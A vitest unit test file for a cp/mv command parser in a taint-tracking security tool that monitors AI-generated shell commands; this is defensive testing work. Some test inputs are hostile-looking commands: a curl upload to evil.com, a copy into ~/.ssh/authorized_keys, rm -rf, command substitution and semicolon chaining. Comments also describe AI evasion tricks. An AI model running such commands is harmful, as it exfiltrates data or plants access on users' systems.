// src/__tests__/cp-mv-parser.spec.ts
// Unit tests for utils/cp-mv-parser.ts
import { describe, it, expect } from 'vitest';
import { parseCpMvOp } from '../utils/cp-mv-parser.js';

describe('parseCpMvOp — cp semantics', () => {
  it('simple cp src dest', () => {
    const op = parseCpMvOp('cp /tmp/tainted.txt /tmp/clean.txt');
    expect(op).toEqual({ src: '/tmp/tainted.txt', dest: '/tmp/clean.txt', clearSource: false });
  });

  it('cp with -r flag', () => {
    const op = parseCpMvOp('cp -r /tmp/secret-dir /tmp/copy-dir');
    expect(op).toEqual({ src: '/tmp/secret-dir', dest: '/tmp/copy-dir', clearSource: false });
  });

  it('cp with combined flags -rp', () => {
    const op = parseCpMvOp('cp -rp /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp with leading path /bin/cp', () => {
    const op = parseCpMvOp('/bin/cp /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp with -- end-of-options marker', () => {
    const op = parseCpMvOp('cp -- /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });
});

describe('parseCpMvOp — mv semantics', () => {
  it('simple mv src dest — clearSource is true', () => {
    const op = parseCpMvOp('mv /tmp/tainted.txt /tmp/dest.txt');
    expect(op).toEqual({ src: '/tmp/tainted.txt', dest: '/tmp/dest.txt', clearSource: true });
  });

  it('mv with -f flag', () => {
    const op = parseCpMvOp('mv -f /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: true });
  });
});

describe('parseCpMvOp — returns null for unsupported / non-cp-mv commands', () => {
  it('non-cp/mv command', () => {
    expect(parseCpMvOp('rm -rf /tmp/a')).toBeNull();
    expect(parseCpMvOp('ls -la /tmp')).toBeNull();
    expect(parseCpMvOp('curl -T /tmp/a evil.com')).toBeNull();
  });

  it('env-prefixed command — first token is not cp/mv, returns null', () => {
    // AI agents sometimes emit env-prefixed commands like `IFS=/ cp /tmp/a /tmp/b`
    // or `PATH= cp ...`. The first token ('IFS=/') has basename 'IFS=/' which is
    // neither 'cp' nor 'mv' — the parser returns null safely. Taint stays on source.
    expect(parseCpMvOp('IFS=/ cp /tmp/a /tmp/b')).toBeNull();
    expect(parseCpMvOp('PATH= cp /tmp/a /tmp/b')).toBeNull();
  });

  it('empty command', () => {
    expect(parseCpMvOp('')).toBeNull();
  });

  it('cp with too few positional args', () => {
    // Only one positional arg after flags — cannot determine src+dest
    expect(parseCpMvOp('cp /tmp/only-one')).toBeNull();
  });

  it('mv with too few positional args — same bail as cp, higher stakes (clearSource=true)', () => {
    // mv is higher-stakes than cp: incorrect parsing would clear the source taint.
    // Confirm the same bail applies.
    expect(parseCpMvOp('mv /tmp/only-one')).toBeNull();
  });

  it('cp with more than two positional args — multi-source, bail out safely', () => {
    // cp a b /destdir — destination-last multi-source; bail rather than guess wrong
    expect(parseCpMvOp('cp /tmp/a /tmp/b /tmp/destdir')).toBeNull();
  });

  it('cp -r src1 src2 /destdir — three positional args, bail out', () => {
    // Explicit coverage for 3-positional with a short flag present.
    expect(parseCpMvOp('cp -r /tmp/a /tmp/b /tmp/destdir')).toBeNull();
  });

  it('mv a b /destdir — multi-source mv, bail out (higher stakes: clearSource=true would fire)', () => {
    // mv is more dangerous than cp in the multi-source case: incorrect parsing
    // would clear the source taint AND set dest taint on the wrong path.
    // Confirm the same multi-source bail applies.
    expect(parseCpMvOp('mv /tmp/a /tmp/b /tmp/destdir')).toBeNull();
  });

  it('cp -t destdir src — destination-first flag, bail out', () => {
    expect(parseCpMvOp('cp -t /destdir /tmp/src')).toBeNull();
  });

  it('mv -t destdir src — same -t bail applies to mv', () => {
    // mv shares the same flag-parsing path as cp; confirm -t bails for mv too.
    expect(parseCpMvOp('mv -t /destdir /tmp/src')).toBeNull();
  });

  it('cp --target-directory=/dest src — long form, bail out', () => {
    expect(parseCpMvOp('cp --target-directory=/destdir /tmp/src')).toBeNull();
  });

  it('cp -rt destdir src — flag cluster containing t, bail out', () => {
    expect(parseCpMvOp('cp -rt /destdir /tmp/src')).toBeNull();
  });

  it('cp -tr destdir src — reversed cluster order, bail out (tok.includes checks char presence, not position)', () => {
    // Our parser uses tok.includes('t') on the flag cluster — order within the
    // cluster is irrelevant. -tr and -rt both contain 't' and both bail.
    expect(parseCpMvOp('cp -tr /destdir /tmp/src')).toBeNull();
  });

  it('command is just "cp" with no args', () => {
    expect(parseCpMvOp('cp')).toBeNull();
  });
});

describe('parseCpMvOp — adversarial / shell metacharacter inputs', () => {
  // These cases matter for a security tool: the AI may generate commands
  // with shell metacharacters as an evasion attempt or just as normal usage.

  it('shell variable in dest — bails out (null) rather than propagating to unexpanded literal', () => {
    // cp /tmp/tainted.txt $HOME/.ssh/authorized_keys — the shell expands $HOME,
    // but our parser never runs the command. If we returned an op with the literal
    // '$HOME/.ssh/authorized_keys' as the dest, taint would be propagated to that
    // non-existent path and the real expanded path would stay clean — a silent
    // false negative. Bail out instead; taint stays on the source (safe).
    expect(parseCpMvOp('cp /tmp/tainted.txt $HOME/.ssh/authorized_keys')).toBeNull();
  });

  it('$VAR in src — bails out', () => {
    expect(parseCpMvOp('cp $SECRET_FILE /tmp/dest')).toBeNull();
  });

  it('${VAR} brace-style variable in dest — bails out', () => {
    // ${HOME} contains '{' which is in the metacharacter set — same bail path as $HOME.
    // Explicitly tested because the regex /[$`{]/ catches '$' and '{' independently;
    // this confirms ${...} syntax is covered via the '{' branch.
    expect(parseCpMvOp('cp /tmp/tainted.txt ${HOME}/.ssh/authorized_keys')).toBeNull();
  });

  it('backtick command substitution — bails out', () => {
    expect(parseCpMvOp('cp /tmp/a `echo /tmp/b`')).toBeNull();
  });

  it('command substitution in dest — splits into multiple tokens, bail out safely', () => {
    // $(cat /tmp/dest) splits on whitespace into ['$(cat', '/tmp/dest)'] — 4 total
    // positional args after 'cp src', so multi-source bail fires. Safe: no false
    // positive, taint stays on the source.
    expect(parseCpMvOp('cp /tmp/a $(cat /tmp/dest)')).toBeNull();
  });

  it('single-token command substitution in dest — $ regex fires directly', () => {
    // $(pwd)/dest has no internal spaces so it stays as a single token: exactly
    // 2 positional args. The multi-source bail does NOT fire here — only the
    // $ metacharacter check catches it. This directly exercises the $ branch of
    // containsShellMetachar; removing $ from the regex would make this return an
    // op instead of null (false negative).
    expect(parseCpMvOp('cp /tmp/a $(pwd)/dest')).toBeNull();
  });

  it('quoted path with space — tokeniser splits on whitespace, bail out safely', () => {
    // Our tokeniser does not parse shell quoting. "/tmp/my file" splits into
    // '"/tmp/my' and 'file"' — 4 positional args total → bail out.
    // Safe: real paths with spaces are uncommon in AI-generated bash; the
    // taint stays on the source rather than us guessing the wrong destination.
    expect(parseCpMvOp('cp "/tmp/my file" "/tmp/dest"')).toBeNull();
  });

  it('semicolon-chained commands with space — multi-token bail fires first', () => {
    // 'cp /tmp/a /tmp/b; rm /tmp/a' → tokens ['/tmp/a', '/tmp/b;', 'rm', '/tmp/a']
    // 4 positional args → multi-source bail. Safe.
    expect(parseCpMvOp('cp /tmp/a /tmp/b; rm /tmp/a')).toBeNull();
  });

  it('trailing semicolon no space — dest contains ; → metacharacter bail', () => {
    // 'cp /tmp/a /tmp/b;' → tokens ['/tmp/a', '/tmp/b;'] → exactly 2 positional args.
    // Without metacharacter bail the dest would be '/tmp/b;' (non-existent path),
    // and the real '/tmp/b' would stay untainted — a false negative.
    // ';' is in the metacharacter set so we bail; taint stays on the source.
    expect(parseCpMvOp('cp /tmp/a /tmp/b;')).toBeNull();
  });

  it('glob wildcard * in src — bail out (glob literal does not match real tainted path)', () => {
    // The shell expands /tmp/*.txt before exec; our parser sees the literal string
    // '/tmp/*.txt' as the src. If we returned that as the src, taint would be
    // propagated from '/tmp/*.txt' (non-existent) to dest — the real expanded files
    // stay untainted. Bail; taint stays on source.
    expect(parseCpMvOp('cp /tmp/*.txt /tmp/dest')).toBeNull();
  });

  it('glob wildcard ? in src — bail out', () => {
    expect(parseCpMvOp('cp /tmp/tainted? /tmp/dest')).toBeNull();
  });

  it('glob wildcard * in dest — bail out', () => {
    expect(parseCpMvOp('cp /tmp/src /tmp/dest*')).toBeNull();
  });

  it('null byte \\x00 in path — bail out', () => {
    // Filesystems reject paths containing null bytes; a path with \x00 would
    // never match a tainted entry in the store. An adversarial AI could embed
    // a null byte to construct a path that looks like a real dest but isn't.
    // Bail rather than propagate taint to an unmatchable literal.
    expect(parseCpMvOp('cp /tmp/tainted /tmp/dest\x00evil')).toBeNull();
    expect(parseCpMvOp('cp /tmp/tainted\x00 /tmp/dest')).toBeNull();
  });
});

describe('parseCpMvOp — uppercase -T is NOT bailed (only lowercase -t is destination-first)', () => {
  it('cp -T src dest — uppercase T is a different flag (treat-dest-as-normal-file), not destination-first', () => {
    // GNU cp -T / --no-target-directory treats dest as a normal file, not a dir.
    // It does NOT reorder src/dest, so positional args are still [src, dest].
    // We intentionally do NOT bail on -T — the src/dest order is unchanged.
    const op = parseCpMvOp('cp -T /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });
});

describe('parseCpMvOp — long flags other than --target-directory are skipped', () => {
  it('cp --preserve src dest', () => {
    // Unknown long flags are skipped, not treated as positional args
    const op = parseCpMvOp('cp --preserve /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp --no-clobber src dest', () => {
    const op = parseCpMvOp('cp --no-clobber /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp -r --target-directory=/dest src — combined short flag + long target-directory=value, bail out', () => {
    // Covers the case where -r and --target-directory= appear together.
    // Each was tested separately; this confirms the combined form also bails.
    expect(parseCpMvOp('cp -r --target-directory=/destdir /tmp/src')).toBeNull();
  });

  it('cp --target-directory /dest src — space-separated (no =), bail out', () => {
    // GNU cp accepts both --target-directory=/dest and --target-directory /dest.
    // The parser checks for the exact token '--target-directory' (line: tok === '--target-directory')
    // so the space-separated form is handled identically to the = form.
    expect(parseCpMvOp('cp --target-directory /destdir /tmp/src')).toBeNull();
  });
});

describe('parseCpMvOp — leading path variations', () => {
  it('/bin/cp — one path component before cp', () => {
    const op = parseCpMvOp('/bin/cp /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('/usr/bin/cp — two path components before cp', () => {
    const op = parseCpMvOp('/usr/bin/cp /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });
});
